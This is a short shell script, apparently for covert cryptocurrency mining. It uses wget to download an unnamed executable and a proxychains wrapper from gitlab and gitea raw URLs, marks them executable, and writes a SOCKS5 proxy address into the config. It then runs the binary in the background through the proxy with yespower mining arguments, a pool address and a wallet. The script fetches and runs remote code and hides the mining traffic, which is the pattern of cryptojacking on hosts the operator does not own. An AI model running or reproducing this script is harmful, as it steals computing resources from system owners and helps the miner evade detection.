proxy="192.252.209.155" 
port="14455" 
wget -q -O 0083075176 https://gitlab.com/node.js2594450/ruby/-/raw/main/5.0.27 && chmod +x 0083075176
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./0083075176 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-999 -n 1)-senio) --timeout 120 -p c=CRNC,mc=VHH -x socks5://192.252.209.155:14455 -S -B
sleep 5 
